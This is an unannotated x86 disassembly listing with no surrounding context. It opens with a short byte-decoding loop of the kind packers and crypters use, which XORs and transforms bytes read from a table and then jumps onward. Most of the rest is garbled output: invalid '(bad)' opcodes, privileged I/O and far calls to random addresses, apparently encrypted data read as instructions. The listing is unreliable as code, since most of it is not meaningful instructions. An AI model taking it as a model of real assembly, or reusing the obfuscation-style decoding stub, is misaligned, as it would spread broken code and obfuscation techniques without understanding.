  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	aaa    
  4060e3:	repz lock mov ebp,0x7b7bc171
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	mov    bl,0xe5
  4060f0:	mov    ds:0x7542e0a8,eax
  4060f5:	pushf  
  4060f6:	xchg   esi,eax
  4060f7:	pop    ecx
  4060f8:	scas   eax,DWORD PTR es:[edi]
  4060f9:	add    eax,0x5e70d873
  4060fe:	cwde   
  4060ff:	mov    eax,ds:0xd028acc2
  406104:	sub    ebp,DWORD PTR [ecx+esi*8-0x6cfb02d7]
  40610b:	jge    0x406095
  40610d:	das    
  40610e:	ss (bad) 
  406110:	cmp    eax,0xcc015546
  406115:	or     ecx,DWORD PTR [eax]
  406117:	call   0x127e:0xf9696b93
  40611e:	xchg   ebx,eax
  40611f:	hlt    
  406120:	mov    ah,0x73
  406122:	enter  0x9893,0x3f
  406126:	pop    es
  406127:	sub    bl,BYTE PTR [esi-0x5c074527]
  40612d:	cld    
  40612e:	inc    esi
  40612f:	push   es
  406130:	setnp  BYTE PTR [esi-0x4750209d]
  406137:	or     DWORD PTR [edx],ebp
  406139:	mov    es,WORD PTR [edi]
  40613b:	clc    
  40613c:	inc    ecx
  40613d:	mov    eax,ds:0x5ea31e04
  406142:	pop    ss
  406143:	push   es
  406144:	and    eax,0x89164601
  406149:	cwde   
  40614a:	dec    esp
  40614b:	lods   al,BYTE PTR ds:[esi]
  40614c:	sub    ah,BYTE PTR [ebx]
  40614e:	rcl    DWORD PTR [ecx],0x2f
  406151:	cmc    
  406152:	sbb    eax,0x195e25f
  406157:	pop    ds
  406158:	aaa    
  406159:	loop   0x4061d3
  40615b:	int3   
  40615c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40615d:	dec    ecx
  40615e:	pop    eax
  40615f:	fwait
  406160:	(bad)  
  406163:	loopne 0x40610c
  406165:	sub    DWORD PTR [eax+0x4d2166c7],edi
  40616b:	in     eax,0x22
  40616d:	jecxz  0x40611b
  40616f:	test   edx,ecx
  406171:	iret   
  406172:	add    eax,0x58c0c68e
  406177:	mov    ch,0xeb
  406179:	out    0x8b,eax
  40617b:	(bad)  
  40617c:	fidivr WORD PTR [edx+ebp*8+0x1]
  406180:	out    0x87,al
  406182:	stos   BYTE PTR es:[edi],al
  406183:	aaa    
  406184:	inc    ebx
  406185:	sbb    DWORD PTR [esi+eiz*4],ecx
  406188:	cwde   
  406189:	mov    ?,WORD PTR [esi-0x7c]
  40618c:	std    
  40618d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40618e:	mov    DWORD PTR [ecx],0x92815664
  406194:	pushf  
  406195:	mov    ebx,0xf1fabf23
  40619a:	inc    ebx
  40619b:	mov    bh,0xa4
  40619d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40619e:	sbb    eax,0x2c715adf
  4061a3:	mov    eax,ds:0x862bd07d
  4061a8:	and    DWORD PTR [ecx-0x6a5120f],0x6a5f0a44
  4061b2:	jmp    0x40621c
  4061b4:	jmp    FWORD PTR [edi-0x66]
  4061b7:	sub    ch,BYTE PTR [ecx+eiz*2]
  4061ba:	and    esp,esi
  4061bc:	or     BYTE PTR ds:0x9f221a78,0xb6
  4061c3:	mov    esi,0x4708d8d
  4061c8:	xor    eax,0xca5c3386
  4061cd:	lahf   
  4061ce:	pop    ebx
  4061cf:	(bad)  
  4061d0:	and    DWORD PTR [ebx],ebx
  4061d2:	jo     0x406180
  4061d4:	cdq    
  4061d5:	(bad)  
  4061d6:	imul   eax,ebp,0x68
  4061d9:	(bad)  
  4061da:	fist   DWORD PTR [edx+0x37]
  4061dd:	mov    ecx,0x94a11bc2
  4061e2:	ds nop
  4061e4:	pop    es
  4061e5:	das    
  4061e6:	test   eax,0xf94daee2
  4061eb:	xchg   ebx,eax
  4061ec:	mov    dl,0x48
  4061ee:	cwde   
  4061ef:	test   DWORD PTR [edi],esp
  4061f1:	xchg   edx,eax
  4061f2:	imul   eax,DWORD PTR [edi-0x3b],0xffffff88
  4061f6:	lds    eax,FWORD PTR [ebx+esi*1+0x56]
  4061fa:	pop    ebx
  4061fb:	lds    edi,FWORD PTR [ebx]
  4061fd:	mov    ecx,0x1455441a
  406202:	or     al,bl
  406204:	js     0x406208
  406206:	sar    DWORD PTR [ecx+ebp*2+0x3a4d13ae],cl
  40620d:	aas    
  40620e:	xchg   esp,eax
  40620f:	jo     0x4061a9
  406211:	(bad)  
  406212:	mov    ah,0x2d
  406214:	test   eax,0xcb476f84
  406219:	or     al,BYTE PTR [edx+0x18]
  40621c:	pushf  
  40621d:	(bad)  
  40621e:	repz mov al,ds:0x63b3a647
  406224:	lods   eax,DWORD PTR ds:[esi]
  406225:	pop    edx
  406226:	add    cl,BYTE PTR [edx-0x7b]
  406229:	sub    al,0x93
  40622b:	lea    ebp,[edi+eax*8-0x56]
  40622f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406230:	daa    
  406231:	pop    di
  406233:	cmc    
  406234:	ror    BYTE PTR [edi-0x5],cl
  406237:	ja     0x4061d1
  406239:	sbb    bh,BYTE PTR [eax]
  40623b:	xor    DWORD PTR [ebp+ebp*4-0x16],esi
  40623f:	pop    ss
  406240:	mov    dl,0xbd
  406242:	cmp    al,0x4f
  406244:	cwde   
  406245:	pop    edx
  406246:	mov    edi,0x5dd27089
  40624b:	imul   eax,DWORD PTR [edx],0xb4966756
  406251:	in     eax,0x3
  406253:	push   esi
  406254:	fcmovnu st,st(0)
  406256:	dec    ecx
  406257:	jmp    0x4061df
  406259:	ss jle 0x40620d
  40625c:	jecxz  0x40620a
  40625e:	mov    ax,ds:0x50984cc0
  406264:	retf   0x399c
  406267:	outs   dx,DWORD PTR ds:[esi]
  406268:	mov    bh,0x2
  40626a:	push   ecx
  40626b:	xchg   edi,eax
  40626c:	div    dl
  40626e:	ds pusha 
  406270:	jb     0x4062cc
  406272:	imul   edi,DWORD PTR cs:[esi+edi*2],0xffffffe3
  406277:	inc    edx
  406278:	cmp    al,BYTE PTR ds:0x1a1ae2e2
  40627e:	add    ebx,DWORD PTR [ebx+edx*8]
  406281:	int    0xbc
  406283:	inc    edx
  406284:	daa    
  406285:	addr16 test eax,0x74a8bc81
  40628b:	ds gs (bad) 
  40628f:	mov    ah,0xd7
  406291:	add    dl,ah
  406293:	push   ss
  406294:	call   0x2db4ca05
  406299:	lock das 
  40629b:	pop    ss
  40629c:	shl    dl,cl
  40629e:	sub    ah,BYTE PTR [ecx]
  4062a0:	nop
  4062a1:	push   ecx
  4062a2:	aas    
  4062a3:	push   ecx
  4062a4:	nop
  4062a5:	adc    BYTE PTR [eax+0x58],dh
  4062a8:	aas    
  4062a9:	(bad)  
  4062aa:	mov    DWORD PTR [ebx],edi
  4062ac:	mov    ecx,cs
  4062ae:	adc    al,BYTE PTR [edi-0x6a422e5f]
  4062b4:	sub    DWORD PTR [esi+0x1f],edi
  4062b7:	shr    BYTE PTR [edi-0x3a10583b],0xea
  4062be:	(bad)  
  4062bf:	jle    0x4062a5
  4062c1:	inc    esi
  4062c2:	(bad)  
  4062c4:	stc    
  4062c5:	test   edi,0x8b5c1632
  4062cb:	sub    al,0x7a
  4062cd:	pop    edi
  4062ce:	sbb    edx,ebp
  4062d0:	inc    edx
  4062d1:	scas   eax,DWORD PTR es:[edi]
  4062d2:	add    ch,BYTE PTR [ecx]
  4062d4:	push   0x35
  4062d6:	sbb    DWORD PTR [ebx],esi
  4062d8:	fs test al,0xe1
  4062db:	jmp    0x1fcc:0xefc26e92
  4062e2:	out    dx,al
  4062e3:	jge    0x406286
  4062e5:	pop    esp
  4062e6:	cwde   
  4062e7:	jns    0x4062fb
  4062e9:	add    esp,ebx
  4062eb:	out    dx,al
  4062ec:	adc    al,0xad
  4062ee:	stc    
  4062ef:	sub    DWORD PTR [esi-0x18],0xb767a592
  4062f6:	cmp    al,0x10
  4062f8:	jp     0x4062fe
  4062fa:	xor    DWORD PTR [ecx],esi
  4062fc:	in     eax,0x7f
  4062fe:	popf   
  4062ff:	mov    esi,0xbf5a01a4
  406304:	bound  edx,QWORD PTR [ebx-0x4a]
  406307:	aaa    
  406308:	add    al,0x2e
  40630a:	sub    dl,0x98
  40630d:	(bad)  
  40630e:	aad    0x7b
  406310:	pop    edi
  406311:	mov    esp,0x35237c
  406316:	sub    dh,bh
  406318:	pusha  
  406319:	mov    al,ds:0x5cdcccfc
  40631e:	call   0x5cb5:0x2e77600f
  406325:	sbb    eax,0xda652e5a
  40632b:	add    al,0xbb
  40632d:	or     bh,ch
  40632f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406330:	sbb    BYTE PTR [eax+0x5baff52c],0x83
  406337:	ror    BYTE PTR [esi+eiz*8-0x45],1
  40633b:	test   eax,0xbfbe640c
  406340:	out    0xb8,eax
  406342:	repnz lock pop ds
  406345:	inc    edi
  406346:	fwait
  406347:	and    bl,bh
  406349:	push   cs
  40634a:	scas   eax,DWORD PTR es:[edi]
  40634b:	clc    
  40634c:	jl     0x406318
  40634e:	pop    ss
  40634f:	repnz leave 
  406351:	les    ebp,FWORD PTR [esi+0x56b355d]
  406357:	fs js  0x40630d
  40635a:	js     0x406388
  40635c:	mov    eax,DWORD PTR [ebp+0x55490c67]
  406362:	mov    WORD PTR [eax],?
  406364:	jg     0x4063bb
  406366:	or     DWORD PTR gs:[esi],0xffffff9a
  40636a:	and    ebp,eax
  40636c:	push   0x65
  40636e:	cli    
  40636f:	jae    0x406307
  406371:	adc    DWORD PTR [ebx+0x4a],0xffffffc1
  406375:	imul   ebp,DWORD PTR [ebp+0x3a],0xffffffb4
  406379:	test   al,0xef
  40637b:	xor    ebp,0xffffffe6
  40637e:	pop    ds
  40637f:	fs jnp 0x406334
  406382:	test   cl,bl
  406384:	loop   0x406398
  406386:	pop    ebp
  406387:	xchg   esp,eax
  406388:	inc    ebp
  406389:	add    BYTE PTR [eax+0x6ce9767d],al
  40638f:	pop    es
  406390:	xchg   esp,eax
  406391:	fdiv   QWORD PTR [ebp+ebp*2+0x42aec19a]
  406398:	mov    ebx,0xddb31d33
  40639d:	mov    dh,0x9
  40639f:	pop    edx
  4063a0:	mov    esp,0x9b2525e4
  4063a5:	push   ebp
  4063a6:	je     0x406341
  4063a8:	add    DWORD PTR [esi+0x4e],esi
  4063ab:	mov    al,0x68
  4063ad:	xchg   ebp,eax
  4063ae:	aad    0x84
  4063b0:	shld   DWORD PTR [ecx+0x4c9f1ba7],esi,cl
  4063b7:	add    DWORD PTR [ecx],edi
  4063b9:	dec    ecx
  4063ba:	inc    edi
  4063bb:	and    al,0x15
  4063bd:	mov    DWORD PTR [eax+0x16],edi
  4063c0:	add    dh,BYTE PTR [edi-0x27d473ea]
  4063c6:	rcl    edx,cl
  4063c8:	popf   
  4063c9:	or     bh,cl
  4063cb:	jmp    0x29f0:0xcd7dd89
  4063d2:	sub    eax,0x217e4b80
  4063d7:	ret    
  4063d8:	or     edi,esi
  4063da:	fs inc ecx
  4063dc:	dec    edx
  4063dd:	push   edx
  4063de:	aam    0x9
  4063e0:	mov    ah,0x22
  4063e2:	out    dx,al
  4063e3:	repz sub BYTE PTR [eax-0x6870904c],ch
  4063ea:	mov    cl,0x5
  4063ec:	push   0xffffffe7
  4063ee:	dec    edi
  4063ef:	mov    dl,0xa8
  4063f1:	dec    edx
  4063f2:	icebp  
  4063f3:	or     al,0x35
  4063f5:	imul   edi,DWORD PTR [ecx-0x72],0xffffff8f
  4063f9:	mov    eax,0xd7e3ec59
  4063fe:	mov    ebp,0x20b281e
  406403:	cmp    BYTE PTR [edx],ah
  406405:	pop    ds
  406406:	mov    dh,0xe1
  406408:	or     bl,dl
  40640a:	cdq    
  40640b:	mov    edi,0x7599dcad
  406410:	in     al,dx
  406411:	fadd   DWORD PTR [edi+0x76]
  406414:	(bad)  
  406415:	out    0xae,al
  406417:	icebp  
  406418:	fsub   QWORD PTR [edx]
  40641a:	xor    cl,dh
  40641c:	mov    WORD PTR [esi-0x55],ss
  40641f:	jb     0x406498
  406421:	pop    ecx
  406422:	fld    QWORD PTR [edi-0x3f]
  406425:	sbb    DWORD PTR [esi],esi
  406427:	shl    dl,cl
  406429:	or     DWORD PTR [eax+edx*2-0xfa96dd7],ebx
  406430:	fiadd  DWORD PTR [esi]
  406432:	add    eax,0xa8c9d8cf
  406437:	mov    bh,0x5a
  406439:	push   0x7d
  40643b:	dec    edi
  40643c:	sub    esi,DWORD PTR [eax+0x1c77545e]
  406442:	sbb    cl,0xd6
  406445:	mov    ds:0xf26c9973,al
  40644a:	lds    esp,FWORD PTR [eax+0x77]
  40644d:	mov    cl,0xee
  40644f:	pop    esi
  406450:	into   
  406451:	push   es
  406452:	(bad)  
  406453:	push   esp
  406454:	(bad)  
  406455:	adc    al,0x21
  406457:	fisubr DWORD PTR [edi+0x9]
  40645a:	push   ss
  40645b:	xchg   esp,eax
  40645c:	push   esi
  40645d:	xchg   ebp,eax
  40645e:	mov    bl,0x71
  406460:	fidiv  DWORD PTR [ecx]
  406462:	pop    ss
  406463:	jge    0x4064d0
  406465:	dec    eax
  406466:	popa   
  406467:	jno    0x406493
  406469:	pop    eax
  40646a:	pop    ebx
  40646b:	arpl   bp,sp
  40646d:	aam    0x2f
  40646f:	adc    dl,BYTE PTR [edi-0x2e]
  406472:	retf   
  406473:	jp     0x4064e3
  406475:	test   DWORD PTR [edi+0x37],ebx
  406478:	jo     0x4064a6
  40647a:	je     0x4064ca
  40647c:	sbb    eax,DWORD PTR [ecx]
  40647e:	sti    
  40647f:	pusha  
  406480:	out    0x0,eax
  406482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406483:	test   BYTE PTR [eax+0x2377a181],bh
  406489:	pushf  
  40648a:	in     al,0x7c
  40648c:	fldenv [edi]
  40648e:	addr16 jo 0x4064ac
  406491:	aaa    
  406492:	jge    0x40644f
  406494:	(bad)  
  406495:	arpl   WORD PTR [esi+0x73fe15b1],sp
  40649b:	jmp    FWORD PTR [edi-0x69]
  40649e:	xchg   ebx,eax
  40649f:	aad    0xd1
  4064a1:	sub    ebp,ebp
  4064a3:	dec    edx
  4064a4:	sub    DWORD PTR [ecx-0x61],edx
  4064a7:	push   edx
  4064a8:	inc    esi
  4064a9:	imul   ecx,DWORD PTR [ebx+0x239084aa],0x2f045b70
  4064b3:	out    dx,al
  4064b4:	sbb    DWORD PTR [ecx-0x3d2c9083],esi
  4064ba:	call   0x972d:0xffaa87e4
  4064c1:	lods   eax,DWORD PTR ds:[esi]
  4064c2:	out    dx,eax
  4064c3:	enter  0x98a6,0x19
  4064c7:	and    cl,al
  4064c9:	push   ecx
  4064ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064cb:	test   BYTE PTR [ecx],dl
  4064cd:	fmul   QWORD PTR [esi+0x5]
  4064d0:	pop    es
  4064d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064d2:	mov    ch,0xc0
  4064d4:	add    eax,0xda4f9cec
  4064d9:	xlat   BYTE PTR ds:[ebx]
  4064da:	es fwait
  4064dc:	jle    0x4064a7
  4064de:	mov    ch,0xde
  4064e0:	mov    edx,0xbdba919f
  4064e5:	jae    0x4064a4
  4064e7:	ss gs test al,0xe1
  4064eb:	into   
  4064ec:	je     0x406541
  4064ee:	add    BYTE PTR [ebp+0x38ff8d81],al
  4064f4:	dec    esp
  4064f5:	cdq    
  4064f6:	popa   
  4064f7:	mov    bh,0x87
  4064f9:	repz sub DWORD PTR [edx+0x56b91444],ecx
  406500:	jo     0x406499
  406502:	cmp    BYTE PTR [esp+eax*2+0x0],ch
  406506:	cwde   
  406507:	push   0xfffffff9
  406509:	stc    
  40650a:	mov    eax,ds:0x24be970d
  40650f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406510:	mov    eax,ds:0x82272d2c
  406515:	push   ebx
  406516:	sbb    al,ch
  406518:	ja     0x4064bd
  40651a:	mov    ds:0x2ea992ed,eax
  40651f:	js     0x406525
  406521:	iret   
  406522:	ja     0x406549
  406524:	jle    0x406588
  406526:	mov    ah,0x9d
  406528:	mov    al,ds:0xf4235e7a
  40652d:	lahf   
  40652e:	inc    ebp
  40652f:	and    BYTE PTR [eax-0x36f1780a],cl
  406535:	mov    esi,0xabd21c3f
  40653a:	clc    
  40653b:	ins    BYTE PTR es:[edi],dx
  40653c:	retf   0xde0d
  40653f:	xor    ebp,ebx
  406541:	and    ah,bl
  406543:	arpl   sp,si
  406545:	xchg   edi,eax
  406546:	adc    esi,DWORD PTR [edx-0x41]
  406549:	or     eax,0x9c555d9d
  40654e:	push   esi
  40654f:	xchg   edx,eax
  406550:	in     al,0xb9
  406552:	mov    ebx,0x1ae722c7
  406557:	pop    ds
  406558:	adc    ch,BYTE PTR ds:0x43f7dc14
  40655e:	or     eax,0xa05b1817
  406563:	dec    DWORD PTR [edx+edx*1]
  406566:	stos   BYTE PTR es:[edi],al
  406567:	xchg   ebx,eax
  406568:	loopne 0x40651a
  40656a:	push   esi
  40656b:	or     eax,0x273c490e
  406570:	add    esp,DWORD PTR [edi]
  406572:	push   ebx
  406573:	mov    ebx,0xe4f4366
  406578:	add    DWORD PTR [esi-0x27444ba3],eax
  40657e:	outs   dx,BYTE PTR ds:[esi]
  40657f:	ss es jg 0x4065da
  406583:	jb     0x4065ef
  406585:	out    0x67,al
  406587:	dec    ecx
  406588:	jmp    0xc4fa:0x712a7a05
  40658f:	sub    BYTE PTR [ebx],0x6
  406592:	sub    bl,dl
  406594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406595:	shr    BYTE PTR [eax+0x660bae53],cl
  40659b:	jnp    0x406599
  40659d:	js     0x4065fd
  40659f:	mov    al,0x89
  4065a1:	push   edx
  4065a2:	lds    eax,FWORD PTR [ecx]
  4065a4:	stos   DWORD PTR es:[edi],eax
  4065a5:	loopne 0x406591
  4065a7:	out    dx,eax
  4065a8:	cmp    bh,bl
  4065aa:	loope  0x406547
  4065ac:	pop    esp
  4065ad:	add    ebp,edi
  4065af:	jecxz  0x4065c0
  4065b1:	shr    DWORD PTR [ebx+ecx*1],0x87
  4065b5:	sub    BYTE PTR [eax],bl
  4065b7:	test   al,0xcf
  4065b9:	sbb    DWORD PTR [eax+0xe],0xc
  4065bd:	xlat   BYTE PTR ds:[ebx]
  4065be:	sbb    al,0x13
  4065c0:	lock mov bh,BYTE PTR [eax+0x4a]
  4065c4:	push   0xdbe7d16c
  4065c9:	xchg   BYTE PTR [esi+0x2d],cl
  4065cc:	jmp    0x1268:0x2c08e723
  4065d3:	pop    ebx
  4065d4:	ins    BYTE PTR es:[edi],dx
  4065d5:	jb     0x406606
  4065d7:	push   ebp
  4065d8:	loope  0x40657f
  4065da:	jae    0x40656d
  4065dc:	dec    ecx
  4065dd:	clc    
  4065de:	mov    dh,BYTE PTR [ebx-0x2f]
  4065e1:	push   ebx
  4065e2:	(bad)  
  4065e3:	adc    eax,0xe5c7b33
  4065e8:	or     al,0x24
  4065ea:	jbe    0x406668
  4065ec:	sbb    BYTE PTR [ecx+0x9c1f080],ah
  4065f2:	in     eax,dx
  4065f3:	inc    ebx
  4065f4:	sti    
  4065f5:	test   BYTE PTR [edi+0x70969305],0x89
  4065fc:	pop    ds
  4065fd:	aam    0x3f
  4065ff:	imul   esp,DWORD PTR [edx-0x215420ad],0x50
  406606:	arpl   WORD PTR [esi-0x28],bx
  406609:	xor    ch,BYTE PTR [edx+0x780a9504]
  40660f:	cmc    
  406610:	push   eax
  406611:	mov    al,ds:0xd72e0dfc
  406616:	jmp    0x2c87cd8e
  40661b:	dec    ebx
  40661c:	(bad)  
  40661d:	fdivrp st(4),st
  40661f:	push   0x9941dd13
  406624:	pop    DWORD PTR [ebp-0x294d6735]
  40662a:	jae    0x406638
  40662c:	cmp    ebp,0xb6bda52d
  406632:	pop    edi
  406633:	or     al,0xb6
  406635:	out    dx,eax
  406636:	test   eax,0x6afb7511
  40663b:	and    ebp,DWORD PTR [esi+0xb]
  40663e:	dec    esi
  40663f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406640:	inc    edx
  406641:	cdq    
  406642:	jge    0x4066a6
  406644:	xchg   DWORD PTR [edi+0x60dd28b3],ebx
  40664a:	shl    DWORD PTR [edx+0x36],0x9b
  40664e:	dec    ebp
  40664f:	sti    
  406650:	push   0xffffffc3
  406652:	add    al,0x2a
  406654:	xchg   BYTE PTR [edx+0x715a28f5],dh
  40665a:	mov    ebx,0xa724b2d6
  40665f:	loope  0x4066d2
  406661:	retf   
  406662:	pop    ecx
  406663:	es inc sp
  406666:	rcr    DWORD PTR [esi+ebx*1-0x60],0xcf
  40666b:	das    
  40666c:	mov    esi,0xbba84781
  406671:	mov    bl,0x72
  406673:	mov    esp,0x28899433
  406678:	loope  0x406640
  40667a:	pop    edx
  40667b:	cmc    
  40667c:	test   DWORD PTR [esi],ecx
  40667e:	mov    edx,0xe0f4a824
  406683:	xchg   esp,eax
  406684:	out    dx,eax
  406685:	(bad)  
  406686:	xchg   edi,eax
  406687:	js     0x4066b4
  406689:	adc    eax,ecx
  40668b:	inc    esi
  40668c:	adc    BYTE PTR [edx],bl
  40668e:	mov    ah,0x3d
  406690:	je     0x4066e7
  406692:	xor    edx,DWORD PTR [eax+ebp*2+0x3f5c8676]
  406699:	(bad)  
  40669b:	adc    al,0x75
  40669d:	add    edi,ebp
  40669f:	mov    ecx,0xb9984431
  4066a4:	addr16 push eax
  4066a6:	push   ecx
  4066a7:	(bad)  
  4066a8:	xor    eax,0x85ab7b95
  4066ad:	dec    edi
  4066ae:	js     0x4066c2
  4066b0:	cmp    ah,ch
  4066b2:	shl    BYTE PTR [ebx-0x5],0xe9
  4066b6:	xchg   ebp,eax
  4066b7:	(bad)  
  4066b8:	bound  ecx,QWORD PTR [esi]
  4066ba:	aad    0x30
  4066bc:	psrld  mm7,mm6
  4066bf:	mov    cl,BYTE PTR [ebx]
  4066c1:	xor    esp,DWORD PTR [eax+eax*4+0x7d1afc8d]
  4066c8:	mov    al,ds:0xb498269
  4066cd:	mov    DWORD PTR ds:0x5ea5b9a9,edx
  4066d3:	sbb    edx,esi
  4066d5:	and    BYTE PTR [ebp+edx*8-0x30],dh
  4066d9:	mov    ecx,0xc811cf2d
  4066de:	out    dx,eax
  4066df:	pop    esi
  4066e0:	dec    eax
  4066e1:	adc    ebp,eax
  4066e3:	repnz mov esp,DWORD PTR [edi]
  4066e6:	fnstsw ax
  4066e8:	dec    esi
  4066e9:	jmp    0x4066e7
  4066eb:	push   edi
  4066ec:	ja     0x406698
  4066ee:	add    DWORD PTR [eax+0x60],ecx
  4066f1:	pop    edi
  4066f2:	add    bl,BYTE PTR [edx-0x41]
  4066f5:	dec    esi
  4066f6:	add    esi,DWORD PTR [edi]
  4066f8:	pop    edx
  4066f9:	call   0xb309e8b9
  4066fe:	icebp  
  4066ff:	ds int3 
  406701:	repnz cmc 
  406703:	cwde   
  406704:	(bad)  
  406705:	in     al,0x54
  406707:	out    0xa1,al
  406709:	xchg   ebx,eax
  40670a:	shl    BYTE PTR [edx],cl
  40670c:	std    
  40670d:	or     ecx,DWORD PTR [ecx]
  40670f:	adc    BYTE PTR [ebx-0x46a1be55],0xd1
  406716:	mov    ecx,DWORD PTR [edi]
  406718:	mov    ebx,0x5d4f004
  40671d:	jns    0x406752
  40671f:	pop    es
  406720:	out    0x34,eax
  406722:	mov    bh,0x9c
  406724:	push   edi
  406725:	scas   eax,DWORD PTR es:[edi]
  406726:	mov    edx,0x622a5376
  40672b:	mov    eax,0x2ee34e8a
  406730:	sub    bh,BYTE PTR ds:[edi+eiz*4-0x3520433e]
  406738:	ret    0x4aba
  40673b:	mov    al,0x2d
  40673d:	cmc    
  40673e:	add    DWORD PTR [eax-0x40],esp
  406741:	dec    ebp
  406742:	cmp    eax,0xa7253453
  406747:	mov    ds:0x56ae10a6,eax
  40674c:	dec    esi
  40674d:	push   es
  40674e:	sub    eax,0x71ddd504
  406753:	dec    ebx
  406754:	xchg   esp,eax
  406755:	xor    al,0x39
  406757:	fadd   QWORD PTR [eax-0x5]
  40675a:	adc    esi,edi
  40675c:	inc    ebx
  40675d:	xchg   ecx,eax
  40675e:	int3   
  40675f:	outs   dx,DWORD PTR ds:[esi]
  406760:	and    DWORD PTR [ecx],eax
  406762:	sbb    edx,DWORD PTR [esi]
  406764:	sti    
  406765:	es daa 
  406767:	jle    0x406734
  406769:	and    esi,DWORD PTR [edx]
  40676b:	rcl    BYTE PTR [edi],1
  40676d:	mov    DWORD PTR [edx],edi
  40676f:	sub    ah,BYTE PTR [ebx+0x42]
  406772:	mov    al,ds:0xc6e8425d
  406777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406778:	adc    bl,BYTE PTR [esi-0x8]
  40677b:	xchg   edx,eax
  40677c:	push   ebp
  40677d:	stc    
  40677e:	inc    eax
  40677f:	lea    esi,[edi]
  406781:	ror    BYTE PTR [ebp+eax*2+0x422303c4],1
  406788:	fwait
  406789:	sub    al,0x37
  40678b:	jle    0x406756
  40678d:	jle    0x4067ba
  40678f:	lds    edi,FWORD PTR [edi-0x14]
  406792:	xchg   ebp,eax
  406793:	mov    cl,0x6a
  406795:	cwde   
  406796:	add    eax,0xf6069233
  40679b:	sub    ecx,DWORD PTR [ebx+0x3a64281e]
  4067a1:	aaa    
  4067a2:	pushf  
  4067a3:	ja     0x406810
  4067a5:	(bad)  
  4067a6:	jae    0x406734
  4067a8:	(bad)  
  4067a9:	bound  ebx,QWORD PTR [ebp+0x68]
  4067ac:	ins    BYTE PTR es:[edi],dx
  4067ad:	xchg   edx,eax
  4067ae:	adc    eax,0x2205c9e1
  4067b3:	mov    eax,0x98b210f1
  4067b8:	(bad)  
  4067b9:	xor    BYTE PTR cs:[ecx+0xcefe5d5],0xa0
  4067c1:	mov    esp,0x67de9b31
  4067c6:	adc    edx,ebx
  4067c8:	ja     0x40680d
  4067ca:	ins    BYTE PTR es:[edi],dx
  4067cb:	xor    al,0xd3
  4067cd:	mov    cl,0xdf
  4067cf:	(bad)  
  4067d1:	mov    ds:0xfff9ca4c,al
  4067d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067d7:	pop    esi
  4067d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067d9:	fs inc edx
  4067db:	shl    DWORD PTR [ebx-0x37],1
  4067de:	in     al,0x3d
  4067e0:	dec    ecx
  4067e1:	out    0x68,eax
  4067e3:	shl    DWORD PTR [edx-0x5b5014c],cl
  4067e9:	mov    edx,DWORD PTR [edi+0x2f78a7bd]
  4067ef:	test   eax,0x9d0078e7
  4067f4:	sbb    al,0xb6
  4067f6:	call   0x3d8ff3af
  4067fb:	and    eax,0x80806167
  406800:	adc    DWORD PTR [eax+0x4b],0xe2f5bd60
  406807:	fmul   DWORD PTR [ebp-0x51]
  40680a:	scas   al,BYTE PTR es:[edi]
  40680b:	(bad)  
  40680c:	sub    eax,0xe8ebb300
  406811:	int    0xba
  406813:	sar    bl,cl
  406815:	dec    eax
  406816:	jge    0x4067f0
  406818:	xchg   BYTE PTR [esi+eiz*1],dh
  40681b:	popf   
  40681c:	mov    ds:0x705f5a6a,eax
  406821:	and    DWORD PTR [esi+0x3d],esi
  406824:	int3   
  406825:	je     0x40687f
  406827:	pop    ebx
  406828:	aad    0xbd
  40682a:	mov    eax,0x6cff9a2c
  40682f:	loop   0x40684d
  406831:	mov    al,ds:0x3baff8b9
  406836:	fdiv   DWORD PTR [edx]
  406838:	cmc    
  406839:	jno    0x406894
  40683b:	push   es
  40683c:	sbb    bl,BYTE PTR [edx]
  40683e:	iret   
  40683f:	cmp    bl,BYTE PTR [eax]
  406841:	adc    eax,0x88d3d075
  406846:	cs gs xchg edx,eax
  406849:	repz mov ecx,db2
  40684d:	add    bh,BYTE PTR [esi]
  40684f:	push   ebx
  406850:	gs nop
  406852:	mov    ch,0x39
  406854:	xchg   eax,edx
  406856:	stc    
